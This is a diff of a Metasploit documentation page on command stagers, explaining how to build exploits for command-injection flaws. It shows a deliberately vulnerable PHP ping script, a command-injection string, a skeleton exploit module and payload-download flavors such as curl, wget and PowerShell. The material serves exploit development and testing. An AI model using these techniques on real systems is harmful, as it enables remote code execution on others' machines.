@@ -1,8 +1,8 @@
-Command stagers provide an easy way to write exploits against typical vulnerabilities such as [command execution](https://www.owasp.org/index.php/Command_Injection) or [code injection](https://www.owasp.org/index.php/Code_Injection). There are currently eight different flavors of command stagers, each uses system command (or commands) to save your payload, sometimes decode, and execute.
+Command stagers provide an easy way to write exploits against typical vulnerabilities such as [command execution](https://www.owasp.org/index.php/Command_Injection) or [code injection](https://www.owasp.org/index.php/Code_Injection). There are currently 14different flavors of command stagers, each uses system command (or commands) to save your payload, sometimes decode, and execute.
 
 # The Vulnerability Test Case
 
-The best way to explain how to use a command stager is probably by demonstrating it. Here we have a command injection vulnerability in PHP, something silly you actually might see in an enterprise-level software. The bug is that you can inject additional system commands in the system call for ping:
+The best way to explain how to use a command stager is probably by demonstrating it. Here we have a command injection vulnerability in example PHP code, something silly you actually might see in enterprise-level software. The bug is that you can inject additional system commands in the system call for ping:
 
 ```php
 <?php
@@ -21,7 +21,7 @@ The best way to explain how to use a command stager is probably by demonstrating
 </html>
 ```
 
-Place the above PHP script (ping.php) on an [Ubuntu + Apache + PHP](https://www.digitalocean.com/community/tutorials/how-to-install-linux-apache-mysql-php-lamp-stack-on-ubuntu-14-04) server.
+Place the above PHP script (ping.php) on an [Ubuntu + Apache + PHP](https://www.digitalocean.com/community/tutorials/how-to-install-linux-apache-mysql-php-lamp-stack-on-ubuntu-14-04) server. Make sure your Apache server isn't exposed to the Internet!
 
 Under normal usage, this is how the script behaves - it just pings the host you specify, and shows
 you the output:
@@ -60,7 +60,7 @@ Now let's talk about how to use a command stager to exploit the above script. Th
 
 **1. Include the Msf::Exploit::CmdStager mixin**
 
-Although there are eight flavors of mixins/stagers, you only need to include [Msf::Exploit::CmdStager](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/cmdstager.rb) when writing a Metasploit exploit. The mixin is basically an interface to all eight command stagers:
+Although there are many flavors of mixins/stagers, you only need to include [Msf::Exploit::CmdStager](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/cmd_stager.rb) when writing a Metasploit exploit. The mixin is basically an interface to all command stagers:
 
 ```ruby
 include Msf::Exploit::CmdStager
@@ -68,7 +68,7 @@ include Msf::Exploit::CmdStager
 
 **2. Declare your flavors**
 
-To tell Msf::Exploit::CmdStager what flavors you want, you can add the ```CmdStagerFlavor``` info in the module's metadata. Either from the common level, or the target level. Multiple flavors are allowed.
+To tell `Msf::Exploit::CmdStager` what flavors you want, you can add the ```CmdStagerFlavor``` info in the module's metadata. Either from the common level, or the target level. Multiple flavors are allowed.
 
 An example of setting flavors for a specific target:
 
@@ -85,11 +85,14 @@ An example of setting flavors for a specific target:
   ]
 ```
 
-Or, you can pass this info to the execute_cmdstager method (see Call #execute_cmdstager to begin)
+Or, you can pass this info to the `execute_cmdstager` method (see Call #execute_cmdstager to begin).
 
 ```ruby
 execute_cmdstager(flavor: :vbs)
 ```
+
+However, it is best to set the compatible list of flavors in `CmdStagerFlavor`, rather than hard-coding the flavor in the `execute_cmdstager` method call, as this allows the operator to choose a flavor from `msfconsole` with `set CmdStager::flavor`
+
 
 **3. Create the execute_command method**
 
@@ -100,9 +103,9 @@ You also must create a ```def execute_command(cmd, opts = {})``` method in your 
 And lastly, in your exploit method, call ```execute_cmdstager``` to begin the command stager.
 
 Over the years, we have also learned that these options are quite handy when calling
-execute_cmdstager:
+`execute_cmdstager`:
 
-* **flavor** - You can specify what command stager (flavor) to use from here. Options are: ```:bourne```, ```:debug_asm```, ```:debug_write```, ```:echo```, ```:printf```, ```:vbs```, ```:certutil```, ```:tftp```.
+* **flavor** - You can specify what command stager (flavor) to use from here.
 * **delay** - How much time to delay between each command execution. 0.25 is default.
 * **linemax** - Maximum number of characters per command. 2047 is default.
 
@@ -111,10 +114,7 @@ execute_cmdstager:
 At the minimum, this is how your exploit should start when you're using the CmdStager mixin:
 
 ```ruby
-require 'msf/core'
-
 class MetasploitModule < Msf::Exploit::Remote
-
   Rank = NormalRanking
 
   include Msf::Exploit::CmdStager
@@ -133,7 +133,7 @@ class MetasploitModule < Msf::Exploit::Remote
       'Payload'         => { 'BadChars' => "\x00" },
       'CmdStagerFlavor' => [ 'printf' ],
       'Privileged'      => false,
-      'DisclosureDate'  => "Jun 10 2016",
+      'DisclosureDate'  => "2016-06-10",
       'DefaultTarget'   => 0))
   end
 
@@ -150,15 +150,15 @@ end
 ```
 
 As you can see, we have chosen the "printf" flavor as our command stager. We will explain more about
-this later, but basically what it does is it writes our payload to /tmp and execute it.
+this later, but basically what it does is it writes our payload to `/tmp` and executes it.
 
-Now let's modify the execute_command method and get code execution against the test case. Based on the PoC, we know that our injection string should look like this:
+Now let's modify the `execute_command` method and get code execution against the test case. Based on the PoC, we know that our injection string should look like this:
 
 ```
 127.0.0.1+%26%26+[Malicious commands]
 ```
 
-We do that in execute_command using [HttpClient](https://github.com/rapid7/metasploit-framework/wiki/How-to-Send-an-HTTP-Request-Using-HTTPClient). Notice there is actually some bad character filtering involved to get the exploit working correctly, which is expected:
+We do that in `execute_command` using [HttpClient](https://github.com/rapid7/metasploit-framework/wiki/How-to-Send-an-HTTP-Request-Using-HTTPClient). Notice there is actually some bad character filtering involved to get the exploit working correctly, which is expected:
 
 ```ruby
 def filter_bad_chars(cmd)
@@ -199,8 +199,25 @@ msf exploit(cmdstager_demo) > run
 
 # Flavors
 
-Now that we know how to use the Msf::Exploit::CmdStager mixin, let's take a look at the command
+Now that we know how to use the `Msf::Exploit::CmdStager` mixin, let's take a look at the command
 stagers you can use.
+
+Available flavors:
+
+* [bourne](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/bourne.rb)
+* [debug_asm](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/debug_asm.rb)
+* [debug_write](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/debug_write.rb)
+* [echo](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/echo.rb)
+* [printf](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/printf.rb)
+* [vbs](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/vbs.rb)
+* [certutil](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/certutil.rb)
+* [tftp](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/tftp.rb)
+* [wget](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/wget.rb)
+* [curl](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/curl.rb)
+* [fetch](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/fetch.rb)
+* [lwprequest](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/lwprequest.rb)
+* [psh_invokewebrequest](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/psh_invokewebrequest.rb)
+
 
 ## VBS Command Stager - Windows Only
 
@@ -261,9 +278,10 @@ You will also need to remember to set the platform in the metadata:
 'Platform' => 'win'
 ```
 
+
 ## Debug_write Command Stager - Windows Only
 
-The [debug_write](https://github.com/rapid7/rex-exploitation/blob/master/data/exploits/cmdstager/debug_write) command stager is an old Windows trick to write a file to the system. In this case, we use debug.exe to write a small .Net binary, and that binary will take a hex-ascii file created by the echo command, decode the binary, and finally execute.
+The [debug_write](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/debug_write.rb) command stager is an old Windows trick to write a file to the system. In this case, we use debug.exe to write a small .Net binary, and that binary will take a hex-ascii file created by the echo command, decode the binary, and finally execute.
 
 Obviously, to be able to use this command stager, you must make sure the target is a Windows system that supports .Net.
 
@@ -284,6 +302,7 @@ You will also need to remember to set the platform in the metadata:
 ```ruby
 'Platform' => 'win'
 ```
+
 
 ## Debug_asm Command Stager - Windows Only
 
@@ -306,6 +325,7 @@ You will also need to remember to set the platform in the metadata:
 ```ruby
 'Platform' => 'win'
 ```
+
 
 ## TFTP Command Stager - Windows Only
 
@@ -333,6 +353,21 @@ You will also need to remember to set the platform in the metadata:
 
 ```ruby
 'Platform' => 'win'
+```
+
+
+## PowerShell Invoke-WebRequest - Windows Only
+
+To use the PowerShell Invoke-WebRequest stager, either specify your CmdStagerFlavor in the metadata:
+
+```ruby
+'CmdStagerFlavor' => [ 'psh_invokewebrequest' ]
+```
+
+Or set the :psh_invokewebrequest key to execute_cmdstager:
+
+```ruby
+execute_cmdstager(flavor: :psh_invokewebrequest )
 ```
 
 ## Bourne Command Stager - Multi Platform
@@ -370,7 +405,7 @@ To use the echo stager, either specify your CmdStagerFlavor in the metadata:
 'CmdStagerFlavor' => [ 'echo' ]
 ```
 
-Or set the :bourne key to execute_cmdstager:
+Or set the :echo key to execute_cmdstager:
 
 ```ruby
 execute_cmdstager(flavor: :echo)
@@ -393,8 +428,67 @@ To use the printf stager, either specify your CmdStagerFlavor in the metadata:
 'CmdStagerFlavor' => [ 'printf' ]
 ```
 
-Or set the :bourne key to execute_cmdstager:
+Or set the :printf key to `execute_cmdstager`:
 
 ```ruby
 execute_cmdstager(flavor: :printf)
+```
+
+## cURL Command Stager - Multi Platform
+
+To use the cURL stager, either specify your CmdStagerFlavor in the metadata:
+
+```ruby
+'CmdStagerFlavor' => [ 'curl' ]
+```
+
+Or set the :curl key to `execute_cmdstager`:
+
+```ruby
+execute_cmdstager(flavor: :curl)
+```
+
+
+## wget Command Stager - Multi Platform
+
+To use the wget stager, either specify your CmdStagerFlavor in the metadata:
+
+```ruby
+'CmdStagerFlavor' => [ 'wget' ]
+```
+
+Or set the :wget key to `execute_cmdstager`:
+
+```ruby
+execute_cmdstager(flavor: :wget)
+```
+
+
+## LWP Request Command Stager - Multi Platform
+
+To use the lwprequest stager, either specify your CmdStagerFlavor in the metadata:
+
+```ruby
+'CmdStagerFlavor' => [ 'lwprequest' ]
+```
+
+Or set the :lwprequest key to `execute_cmdstager`:
+
+```ruby
+execute_cmdstager(flavor: :lwprequest)
+```
+
+
+## Fetch Command Stager - BSD Only
+
+To use the fetch stager, either specify your CmdStagerFlavor in the metadata:
+
+```ruby
+'CmdStagerFlavor' => [ 'fetch' ]
+```
+
+Or set the :fetch key to `execute_cmdstager`:
+
+```ruby
+execute_cmdstager(flavor: :fetch)
 ```
